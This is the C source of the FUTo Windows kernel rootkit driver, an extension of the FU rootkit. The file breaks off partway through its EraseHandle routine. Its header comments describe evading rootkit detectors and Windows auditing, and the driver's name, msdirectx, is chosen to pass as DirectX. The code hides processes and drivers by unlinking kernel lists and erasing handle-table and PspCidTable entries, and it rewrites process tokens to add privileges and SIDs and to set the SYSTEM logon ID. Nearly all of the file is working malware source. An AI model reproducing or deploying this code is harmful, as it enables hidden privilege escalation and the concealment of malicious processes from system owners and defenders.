///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: Peter Silberman peter.silberman@gmail.com
//         C.H.A.O.S.      unknown
//
// Description: This is the main rootkit code. It builds upon Fuzen's FU rootkit, but it
//              goes quite a bit further. FUTo removes pointers from the CSRSS.EXE
//              process that was a tip off to the hidden processes. It also unhooks the
//              the hidden process from the linked list of handle tables. In the past,
//              F-Secure Blacklight used the linked handle table list to locate hidden
//              processes. Also new to FUTo is a DKOM trick to the PspCidTable. The
//              PspCidTable contains the addresses of all the EPROCESS and ETHREAD 
//              objects. By exhaustively calling OpenProcess on all the possible PIDs
//              a rootkit detector could find the hidden processes. By modifying the
//              PspCidTable, FUTo does not fall victim to this detection method. 
//
// Date:    12/25/2005
// Version: 3.0
//
// Notes:       FUTo's hidden processes may not be able to properly create child processes.
//              If this is the case, simply modify the unlinking of the handle table list.
//              Also, FUTo has to add the hidden entries to the PspCidTable before the
//              hidden process is destroyed. Otherwise, the system will bluescreen. If
//              this leads to detection, we have other means to keep the system alive.
//
//
// Old header...
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: This driver does all the work of fu.exe. The driver is never unloaded 
//              until reboot. You can use whatever methods you like to load the driver 
//				such as SystemLoadAndCallImage suggested by Greg Hoglund. The driver 
//              is named msdirectx.sys. It is a play on Microsoft's DirectX and is named
//              this to help hide it. (A future tool will hide it completely!) The 
//              driver can change the groups and privileges on any process. It can also 
//              hide a process. Another feature is it can impersonate another logon 
//              session so that Windows Auditing etc. does not know what user really 
//              performed the actions you choose to take with the process. It does all 
//              this by Direct Kernel Object Manipulation (TM). No worries about do I have 
//              permission to that process, token, etc. If you can load a driver once, 
//              you are golden! NOW IT HIDES DRIVERS TOO!
//
// Date:    5/27/2003
// Version: 2.0
//
// Date     7/04/2003   Fixed a problem with a modified token not being inheritable.
//		   12/04/2003   Fixed problem with faking out the Windows Event Viewer.	
//						Cleaned up the code a lot! 
//		   12/05/2003   Now the driver walks the PsLoadedModuleList and removes references 
//                      to the device being hidden. Even after the device is hidden, a user 
//						land process can open a handle to it if its symbolic link name still 
//						exists. Obviously, a stealth driver would not want to create a or it 
//						could delete the symbolic link once it has initialized through the use
//						of an IOCTL.	

#include "ntddk.h"
#include "stdio.h"
#include "stdlib.h"

#include "Rootkit.h"
#include "ProcessName.h"
#include "ioctlcmd.h"
#include "libdasm.h"

const WCHAR deviceLinkBuffer[]  = L"\\DosDevices\\msdirectx";
const WCHAR deviceNameBuffer[]  = L"\\Device\\msdirectx";


//#define DEGUBPRINT
//#ifdef DEBUGPRINT
	#define   DebugPrint		DbgPrint
//#else
//	#define   DebugPrint
//#endif
   
NTSTATUS DriverEntry(
				   IN PDRIVER_OBJECT  DriverObject,
				   IN PUNICODE_STRING RegistryPath
					)
{
	
    NTSTATUS                ntStatus;
    UNICODE_STRING          deviceNameUnicodeString;
    UNICODE_STRING          deviceLinkUnicodeString;        


	// Get the offset of the process name in the EPROCESS structure.

	gpeproc_system = PsGetCurrentProcess();
	

	
	gcid_table = GetPspCidTable(); 

	
	//
	// Setup our Process NotifyRoutine
	//
	// ntStatus = PsSetCreateProcessNotifyRoutine (NotifyRoutine, FALSE);
	
	// ntStatus = PsSetCreateThreadNotifyRoutine (ThreadNotifyRoutine);

	g_NoGUIFlag = 0;
	
	gul_ProcessNameOffset = GetLocationOfProcessName(PsGetCurrentProcess());
	if (!gul_ProcessNameOffset)
		return STATUS_UNSUCCESSFUL;

	ntStatus = SetupGlobalsByOS();
    if(!NT_SUCCESS(ntStatus))
        return ntStatus;

	if((gpeproc_csrss = (PEPROCESS)FindProcessEPROCByName("CSRSS.EXE\0")) == 0)
		return STATUS_UNSUCCESSFUL;

	gp_processType = FindObjectTypes("\\ObjectTypes\\Process");
	if (gp_processType == NULL)
		return STATUS_UNSUCCESSFUL;

	// Setup our name and symbolic link. 
    RtlInitUnicodeString (&deviceNameUnicodeString,
                          deviceNameBuffer );
    RtlInitUnicodeString (&deviceLinkUnicodeString,
                          deviceLinkBuffer );
    // Set up the device
    //
    ntStatus = IoCreateDevice ( DriverObject,
                                0, // For driver extension
                                &deviceNameUnicodeString,
                                FILE_DEVICE_ROOTKIT,
                                0,
                                TRUE,
                                &g_RootkitDevice );

    if(! NT_SUCCESS(ntStatus))
	{
        DebugPrint(("Failed to create device!\n"));
        return ntStatus;
    }
 
		
	ntStatus = IoCreateSymbolicLink (&deviceLinkUnicodeString,
                                        &deviceNameUnicodeString );
    if(! NT_SUCCESS(ntStatus)) 
	{
		IoDeleteDevice(DriverObject->DeviceObject);
        DebugPrint("Failed to create symbolic link!\n");
        return ntStatus;
    }


    // Create dispatch points for all routines that must be handled
    DriverObject->MajorFunction[IRP_MJ_SHUTDOWN]        =
    DriverObject->MajorFunction[IRP_MJ_CREATE]          =
    DriverObject->MajorFunction[IRP_MJ_CLOSE]           =
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = RootkitDispatch;

	// Its extremely unsafe to unload a system-call hooker.
	// Use GREAT caution.
    DriverObject->DriverUnload                          = RootkitUnload;
   
	gul_PsLoadedModuleList = (PMODULE_ENTRY) FindPsLoadedModuleList(DriverObject);
	if (!gul_PsLoadedModuleList)
	{
		IoDeleteSymbolicLink( &deviceLinkUnicodeString );
		// Delete the device object
		IoDeleteDevice( DriverObject->DeviceObject );
		return STATUS_UNSUCCESSFUL;
	}


    return STATUS_SUCCESS;
}


NTSTATUS RootkitUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING          deviceLinkUnicodeString;
	PDEVICE_OBJECT			p_NextObj;

	p_NextObj = DriverObject->DeviceObject;

	if (p_NextObj != NULL)
	{
        // Delete the symbolic link for our device
		//
		RtlInitUnicodeString( &deviceLinkUnicodeString, deviceLinkBuffer );
		IoDeleteSymbolicLink( &deviceLinkUnicodeString );
		// Delete the device object
		//
		IoDeleteDevice( DriverObject->DeviceObject );
		return STATUS_SUCCESS;
	}
	return STATUS_SUCCESS;
}



NTSTATUS 
RootkitDispatch(
    IN PDEVICE_OBJECT DeviceObject, 
    IN PIRP Irp 
    )
{
    PIO_STACK_LOCATION      irpStack;
    PVOID                   inputBuffer;
    PVOID                   outputBuffer;
    ULONG                   inputBufferLength;
    ULONG                   outputBufferLength;
    ULONG                   ioControlCode;
	NTSTATUS				ntstatus;

    //
    // Go ahead and set the request up as successful
    //
    ntstatus = Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    //
    // Get a pointer to the current location in the Irp. This is where
    //     the function codes and parameters are located.
    //
    irpStack = IoGetCurrentIrpStackLocation (Irp);

    //
    // Get the pointer to the input/output buffer and its length
    //
    inputBuffer             = Irp->AssociatedIrp.SystemBuffer;
    inputBufferLength       = irpStack->Parameters.DeviceIoControl.InputBufferLength;
    outputBuffer            = Irp->AssociatedIrp.SystemBuffer;
    outputBufferLength      = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
    ioControlCode           = irpStack->Parameters.DeviceIoControl.IoControlCode;

    switch (irpStack->MajorFunction) {
    case IRP_MJ_CREATE:
        break;

    case IRP_MJ_SHUTDOWN:
        break;

    case IRP_MJ_CLOSE:
        break;

    case IRP_MJ_DEVICE_CONTROL:

        if(IOCTL_TRANSFER_TYPE(ioControlCode) == METHOD_NEITHER) {
            outputBuffer = Irp->UserBuffer;
        }

        // Its a request from rootkit 
        ntstatus = RootkitDeviceControl(	irpStack->FileObject, TRUE,
												inputBuffer, inputBufferLength, 
												outputBuffer, outputBufferLength,
												ioControlCode, &Irp->IoStatus, DeviceObject );
        break;
    }
    IoCompleteRequest( Irp, IO_NO_INCREMENT );
    return ntstatus;   
}


NTSTATUS
RootkitDeviceControl(
    IN PFILE_OBJECT FileObject, 
    IN BOOLEAN Wait,
    IN PVOID InputBuffer, 
    IN ULONG InputBufferLength, 
    OUT PVOID OutputBuffer, 
    IN ULONG OutputBufferLength, 
    IN ULONG IoControlCode, 
    OUT PIO_STATUS_BLOCK IoStatus, 
    IN PDEVICE_OBJECT DeviceObject 
    ) 
{
	NTSTATUS ntStatus;
    UNICODE_STRING          deviceLinkUnicodeString;
	MODULE_ENTRY m_current;
	PMODULE_ENTRY pm_current;
	ANSI_STRING ansi_DriverName;
	ANSI_STRING hide_DriverName;
	UNICODE_STRING uni_hide_DriverName;
	int	i_count = 0,   i_numLogs = 0,      find_PID = 0;
	int nluids  = 0, i_PrivCount = 0, i_VariableLen = 0;
	int i_LuidsUsed = 0, luid_attr_count = 0, i_SidCount = 0;
	int i_SidSize = 0, i_spaceNeeded = 0, i_spaceSaved = 0; 
	int i_spaceUsed = 0, sid_count  = 0;
	DWORD eproc      = 0x00000000;
	DWORD start_eproc= 0x00000000;
	DWORD token      = 0x00000000;
	PLIST_ENTRY          plist_active_procs = NULL;
	PLUID_AND_ATTRIBUTES luids_attr = NULL;
	PLUID_AND_ATTRIBUTES luids_attr_orig = NULL;
	PSID_AND_ATTRIBUTES  sid_ptr_old = NULL;

	void *varpart  = NULL, *varbegin = NULL, *psid = NULL;

	DWORD SizeOfOldSids, SizeOfLastSid, d_SidStart;

	IoStatus->Status = STATUS_SUCCESS;
    IoStatus->Information = 0;

    switch ( IoControlCode ) 
	{

	case IOCTL_ROOTKIT_HIDEME:
		if ((InputBufferLength < sizeof(DWORD)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		find_PID = *((DWORD *)InputBuffer);
		if (find_PID == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
				
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
		*((DWORD *)plist_active_procs->Blink) = (DWORD) plist_active_procs->Flink;
		*((DWORD *)plist_active_procs->Flink+1) = (DWORD) plist_active_procs->Blink;

		plist_active_procs->Flink = (LIST_ENTRY *) &(plist_active_procs->Flink); // Change the current EPROCESS
		plist_active_procs->Blink = (LIST_ENTRY *) &(plist_active_procs->Flink); // so we don't point to crap
		g_HiddenPID = *((DWORD*)(eproc+PIDOFFSET));
		EraseHandle((PEPROCESS)gpeproc_csrss, (PVOID)eproc);
	

		EraseObjectFromPspCidTable(gcid_table, (PVOID)eproc, ID_PROCESS,*((DWORD*)(eproc+PIDOFFSET)), 0 );
        *((DWORD*)(eproc+PIDOFFSET)) = 0;

		HideThreadsInTargetProcess((PEPROCESS)eproc, gpeproc_csrss);
		UnHookHandleListEntry((PEPROCESS)eproc);
		DecrementObjectCount(gp_processType);

	  break;

	case IOCTL_ROOTKIT_HIDE_NONGUI:
		if ((InputBufferLength < sizeof(DWORD)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		find_PID = *((DWORD *)InputBuffer);
		if (find_PID == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		g_NoGUIFlag = 1;
 		plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
		*((DWORD *)plist_active_procs->Blink) = (DWORD) plist_active_procs->Flink;
		*((DWORD *)plist_active_procs->Flink+1) = (DWORD) plist_active_procs->Blink;

		plist_active_procs->Flink = (LIST_ENTRY *) &(plist_active_procs->Flink); // Change the current EPROCESS
		plist_active_procs->Blink = (LIST_ENTRY *) &(plist_active_procs->Flink); // so we don't point to crap
		g_HiddenPID = *((DWORD*)(eproc+PIDOFFSET));
		EraseHandle((PEPROCESS)gpeproc_csrss, (PVOID)eproc);
	

		EraseObjectFromPspCidTable(gcid_table, (PVOID)eproc, ID_PROCESS,*((DWORD*)(eproc+PIDOFFSET)), 0 );
        *((DWORD*)(eproc+PIDOFFSET)) = 0;
        
		HideThreadsInPspCidTable((PEPROCESS)eproc);

		HideThreadsInTargetProcess((PEPROCESS)eproc, gpeproc_csrss);
		UnHookHandleListEntry((PEPROCESS)eproc);
		DecrementObjectCount(gp_processType);
	
	
		break;
	
	case IOCTL_ROOTKIT_SETPRIV:
		if ((InputBufferLength < sizeof(struct _vars)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS *)InputBuffer)->the_PID;
		luids_attr = ((VARS *)InputBuffer)->pluida;
		nluids = ((VARS *)InputBuffer)->num_luids;

		if ((find_PID == 0x00000000) || (luids_attr == NULL) || (nluids == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		token = FindProcessToken(eproc);

		i_PrivCount     = *(PDWORD)(token + PRIVCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		//FindTokenParams(token, &i_PrivCount, (PDWORD)&luids_attr_orig);

		// If the new privilege already exists in the token, just change its Attribute field.
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			for (i_LuidsUsed = 0; i_LuidsUsed < nluids; i_LuidsUsed++)
			{
				if((luids_attr[i_LuidsUsed].Attributes != 0xffffffff) && (memcmp(&luids_attr_orig[luid_attr_count].Luid, &luids_attr[i_LuidsUsed].Luid, sizeof(LUID)) == 0))
				{
					luids_attr_orig[luid_attr_count].Attributes = luids_attr[i_LuidsUsed].Attributes;
					luids_attr[i_LuidsUsed].Attributes = 0xffffffff; // Canary value we will use
				}
			}
		}

		// OK, we did not find one of the new Privileges in the set of existing privileges so we are going to find the
		// disabled privileges and overwrite them.
		for (i_LuidsUsed = 0; i_LuidsUsed < nluids; i_LuidsUsed++)
		{
			if (luids_attr[i_LuidsUsed].Attributes != 0xffffffff)
			{
				for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
				{
					// If the privilege was disabled anyway, it was not necessary and we are going to reuse this space for our 
					// new privileges we want to add. Not all the privileges we request may get added because of space so you
					// should order the new privileges in decreasing order.
					if((luids_attr[i_LuidsUsed].Attributes != 0xffffffff) && (luids_attr_orig[luid_attr_count].Attributes == 0x00000000))
					{
						luids_attr_orig[luid_attr_count].Luid       = luids_attr[i_LuidsUsed].Luid;
						luids_attr_orig[luid_attr_count].Attributes = luids_attr[i_LuidsUsed].Attributes;
						luids_attr[i_LuidsUsed].Attributes          = 0xffffffff; // Canary value we will use
					}
				}
			}
		}

		break;

	case IOCTL_ROOTKIT_SETSID:
		if ((InputBufferLength < sizeof(struct _vars2)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS2 *)InputBuffer)->the_PID;
		psid = ((VARS2 *)InputBuffer)->pSID;
		i_SidSize = ((VARS2 *)InputBuffer)->i_SidSize;

		if ((find_PID == 0x00000000) || (psid == NULL) || (i_SidSize == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);
		i_PrivCount     = *(int *)(token + PRIVCOUNTOFFSET);
		i_SidCount      = *(int *)(token + SIDCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		varbegin        = (PVOID) luids_attr_orig;
		i_VariableLen   = *(int *)(token + PRIVCOUNTOFFSET + 4);
		sid_ptr_old     = *(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET);

		// This is going to be our temporary workspace
		varpart = ExAllocatePool(PagedPool, i_VariableLen);
		if (varpart == NULL)
		{
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		RtlZeroMemory(varpart, i_VariableLen);

		// Copy only the Privileges enabled. We will overwrite the disabled privileges to make room for the new SID
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			if(((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes != SE_PRIVILEGE_DISABLED)
			{
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Luid = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Luid;
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Attributes = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes;
				i_LuidsUsed++;
			}			
		}

		// Calculate the space that we need within the existing token
		i_spaceNeeded = i_SidSize + sizeof(SID_AND_ATTRIBUTES);
		i_spaceSaved  = (i_PrivCount - i_LuidsUsed) * sizeof(LUID_AND_ATTRIBUTES);
		i_spaceUsed   = i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES);

		// There is not enough room for the new SID. Note: I am ignoring the Restricted SID's. They may also
		// be a part of the variable length part.
		if (i_spaceSaved  < i_spaceNeeded)
		{
			ExFreePool(varpart);
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlCopyMemory((PVOID)((DWORD)varpart+i_spaceUsed), (PVOID)((DWORD)varbegin + (i_PrivCount * sizeof(LUID_AND_ATTRIBUTES))), i_SidCount * sizeof(SID_AND_ATTRIBUTES));

		for (sid_count = 0; sid_count < i_SidCount; sid_count++)
		{
			//((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid =  (PSID)((DWORD) sid_ptr_old[sid_count].Sid - ((i_PrivCount * sizeof(LUID_AND_ATTRIBUTES)) - (i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES))) + sizeof(SID_AND_ATTRIBUTES));
			((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid =  (PSID)(((DWORD) sid_ptr_old[sid_count].Sid) - ((DWORD) i_spaceSaved) + ((DWORD)sizeof(SID_AND_ATTRIBUTES)));
			((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Attributes = sid_ptr_old[sid_count].Attributes;
		}

		// Setup the new SID_AND_ATTRIBUTES properly.
		SizeOfLastSid = (DWORD)varbegin + i_VariableLen; 
		SizeOfLastSid = SizeOfLastSid - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[i_SidCount-1].Sid;
		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[i_SidCount].Sid = (PSID)((DWORD)((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[i_SidCount-1].Sid + SizeOfLastSid);
		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[i_SidCount].Attributes = 0x00000007;

		// Copy the old SID's, but make room for the new SID_AND_ATTRIBUTES
		SizeOfOldSids = (DWORD)varbegin + i_VariableLen; 
		SizeOfOldSids = SizeOfOldSids - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[0].Sid;
		RtlCopyMemory((VOID UNALIGNED *)((DWORD)varpart + (i_spaceUsed)+((i_SidCount+1)*sizeof(SID_AND_ATTRIBUTES))), (CONST VOID UNALIGNED *)((DWORD)varbegin+(i_PrivCount*sizeof(LUID_AND_ATTRIBUTES))+(i_SidCount*sizeof(SID_AND_ATTRIBUTES))), SizeOfOldSids); 

		// Copy the new stuff right over the old data
		RtlZeroMemory(varbegin, i_VariableLen);
		RtlCopyMemory(varbegin, varpart, i_VariableLen);

		// Copy the new SID at the end of the old SID's.
		RtlCopyMemory(((PSID_AND_ATTRIBUTES)((DWORD)varbegin+(i_spaceUsed)))[i_SidCount].Sid, psid, i_SidSize);

		// Fix the token back up.
		*(int *)(token + SIDCOUNTOFFSET) += 1;
		*(int *)(token + PRIVCOUNTOFFSET) = i_LuidsUsed;
		*(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET) = (PSID_AND_ATTRIBUTES)((DWORD) varbegin + (i_spaceUsed));
		
		ExFreePool(varpart);
		break;

	case IOCTL_ROOTKIT_SETAUTHID:
		if ((InputBufferLength < sizeof(struct _vars2)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS2 *)InputBuffer)->the_PID;
		psid = ((VARS2 *)InputBuffer)->pSID;
		i_SidSize = ((VARS2 *)InputBuffer)->i_SidSize;

		if ((find_PID == 0x00000000) || (psid == NULL) || (i_SidSize == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);
		i_PrivCount     = *(int *)(token + PRIVCOUNTOFFSET);
		i_SidCount      = *(int *)(token + SIDCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		varbegin        = (PVOID) luids_attr_orig;
		i_VariableLen   = *(int *)(token + PRIVCOUNTOFFSET + 4);
		sid_ptr_old     = *(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET);

		// This is going to be our temporary workspace
		varpart = ExAllocatePool(PagedPool, i_VariableLen);
		if (varpart == NULL)
		{
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlZeroMemory(varpart, i_VariableLen);

		// Copy only the Privileges enabled. We will overwrite the disabled privileges to make room for the new SID
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			if(((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes != SE_PRIVILEGE_DISABLED)
			{
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Luid = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Luid;
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Attributes = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes;
				i_LuidsUsed++;
			}			
		}

		// Calculate the space that we need within the existing token
		i_spaceNeeded = i_SidSize + sizeof(SID_AND_ATTRIBUTES);
		i_spaceSaved  = (i_PrivCount - i_LuidsUsed) * sizeof(LUID_AND_ATTRIBUTES);
		i_spaceUsed   = i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES);

		// There is not enough room for the new SID. Note: I am ignoring the Restricted SID's. They may also
		// be a part of the variable length part.
		if (i_spaceSaved  < i_spaceNeeded)
		{
			ExFreePool(varpart);
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[0].Sid =  (PSID) ((DWORD) varbegin + (i_spaceUsed) + ((i_SidCount+1) * sizeof(SID_AND_ATTRIBUTES)));
		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[0].Attributes = 0x00000000;

		d_SidStart = ((DWORD) varbegin + (i_spaceUsed) + ((i_SidCount+1) * sizeof(SID_AND_ATTRIBUTES))); 
		for (sid_count = 0; sid_count < i_SidCount; sid_count++)
		{
			if (sid_count == 0)
			{
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Sid =  (PSID) (d_SidStart + i_SidSize); 
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Attributes =  0x00000007;
			}
			else {
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Sid =  (PSID) ((DWORD)sid_ptr_old[sid_count].Sid - (DWORD)sid_ptr_old[sid_count-1].Sid + (DWORD)((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid); 
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Attributes = sid_ptr_old[sid_count].Attributes;
			}
		}
		// Copy the new SID.
		RtlCopyMemory((PVOID) ((DWORD)varpart+(i_spaceUsed) + ((i_SidCount+1) * sizeof(SID_AND_ATTRIBUTES))), psid, i_SidSize);

		// Copy the old SID's, but make room for the new SID_AND_ATTRIBUTES
		SizeOfOldSids = (DWORD)varbegin + i_VariableLen; 
		SizeOfOldSids = SizeOfOldSids - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[0].Sid;
		//DbgPrint("The SizeOfOldSids = %x\n",SizeOfOldSids);
		RtlCopyMemory((VOID UNALIGNED *)((DWORD)varpart + (i_spaceUsed)+(i_SidCount*sizeof(SID_AND_ATTRIBUTES))+i_spaceNeeded), (CONST VOID UNALIGNED *)((DWORD)varbegin+(i_PrivCount*sizeof(LUID_AND_ATTRIBUTES))+(i_SidCount*sizeof(SID_AND_ATTRIBUTES))), SizeOfOldSids); 

		// Copy the new stuff right over the old data
		RtlZeroMemory(varbegin, i_VariableLen);
		RtlCopyMemory(varbegin, varpart, i_VariableLen);

		// Fix the token back up.
		*(int *)(token + SIDCOUNTOFFSET) += 1;
		*(int *)(token + PRIVCOUNTOFFSET) = i_LuidsUsed;
		*(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET) = (PSID_AND_ATTRIBUTES)((DWORD) varbegin + (i_spaceUsed));

		// Set the AUTH_ID in the token to the LUID for the System account.
		*(int *)(token + AUTHIDOFFSET) = SYSTEM_LUID;
			
		ExFreePool(varpart);

	break;


  	case IOCTL_ROOTKIT_HIDEDRIV:
		// Do some verification on the input buffer.
		if ((InputBufferLength < sizeof(char)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (gul_PsLoadedModuleList == NULL)
		{
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		hide_DriverName.Length = (USHORT) InputBufferLength;
		hide_DriverName.MaximumLength = (USHORT) InputBufferLength;
		hide_DriverName.Buffer = (PCHAR)InputBuffer;

		ntStatus = RtlAnsiStringToUnicodeString(&uni_hide_DriverName, &hide_DriverName, TRUE);
		if(!NT_SUCCESS(ntStatus)) {
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		pm_current =  gul_PsLoadedModuleList;

		while ((PMODULE_ENTRY)pm_current->le_mod.Flink != gul_PsLoadedModuleList)
		{
			//DbgPrint("Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
			// This works on Windows XP SP1 and Windows 2003.
			if ((pm_current->unk1 != 0x00000000) && (pm_current->driver_Path.Length != 0))
			{
				if (RtlCompareUnicodeString(&uni_hide_DriverName, &(pm_current->driver_Name), FALSE) == 0)
				{
					*((PDWORD)pm_current->le_mod.Blink)        = (DWORD) pm_current->le_mod.Flink;
					pm_current->le_mod.Flink->Blink            = pm_current->le_mod.Blink;
					//DbgPrint("Just hid %s\n",hide_DriverName.Buffer);
					break;
				}
			}
			pm_current =  (MODULE_ENTRY*)pm_current->le_mod.Flink;
		}

		if( NT_SUCCESS(ntStatus)) {
			RtlFreeUnicodeString(&uni_hide_DriverName);
		}

    break;

	default:
		IoStatus->Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

    return IoStatus->Status;
}


////////////////////////////////////////////////////////////////////
// void EraseHandle
//
//      IN PEPROCESS         address of the EPROCESS block whose
//                           handle table will be parsed and altered.
//
//		PVOID				 address of the object to hide.
//
//      OUT
//
//		Description:         Erases the target object from the handle
//                           table if it is found.
//
//      Note:				 We do not first lock the handle table so
//                           things could get dicey
void EraseHandle(PEPROCESS eproc, PVOID tarHandle)
{
	PTABLE_ENTRY   orig_tableEntry, p_tableEntry, *pp_tableEntry, **ppp_tableEntry;
	int a, b, c;
	int i_numHandles, i_hperPage, i_numTables; 
	int i_handle;

	//DbgPrint("Hiding %x from %s process handle table.\n", tarHandle, (DWORD)eproc+gul_ProcessNameOffset);
	i_numHandles = *(int*)((*(PDWORD)((DWORD) eproc + HANDLETABLEOFFSET)) + HANDLECOUNTOFFSET);
	orig_tableEntry = (PTABLE_ENTRY)*(PDWORD)((*(PDWORD)((DWORD) eproc + HANDLETABLEOFFSET)) + TABLEOFFSET);
	i_numTables = ((DWORD)orig_tableEntry & 3);

	if (b_isXP2K3 == TRUE)
	{
		i_hperPage = PAGE_SIZE/sizeof(TABLE_ENTRY);	
		
		if (i_numTables == 0)
		{
			//DbgPrint("Found a single level handle table.\n");
			p_tableEntry = (PTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
			for (a = 0; a < i_hperPage; a++)
			{
				if (((p_tableEntry[a].object ^ 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle - 0x18))
				{
					//DbgPrint("Handle = %x Object Header %x Security %x\n", a*4, ((p_tableEntry[a].object | 0x80000000) & 0xfffffff8), p_tableEntry[a].security);
					p_tableEntry[a].object = 0;
					p_tableEntry[a].security = 0;
				}
			}
		}
		else if (i_numTables == 1)
		{
			//DbgPrint("Found a two level handle table.\n");
